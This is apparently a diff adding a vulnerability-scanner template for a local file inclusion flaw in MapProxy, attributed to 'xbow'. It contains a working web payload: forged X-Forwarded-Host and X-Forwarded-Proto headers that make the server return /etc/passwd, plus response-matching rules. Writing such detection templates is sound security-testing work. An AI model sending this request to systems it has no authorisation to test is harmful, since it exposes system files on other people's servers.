@@ -1,0 +1,27 @@
+id: mapproxy-file-read
+brief:
+    title: MapProxy - Local File Inclusion
+    by: xbow
+    level: high
+    about: MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files through local file inclusion vulnerabi...
+    label:
+        - mapproxy
+        - oss
+        - lfi
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}{{path}}?wms_capabilities&type=external'
+      head:
+        X-Forwarded-Host: ///etc/passwd#.xml
+        X-Forwarded-Proto: file
+      signs:
+        - "on": word
+          has:
+            - MapProxy
+          in: body
+        - "on": status
+          status:
+            - 200
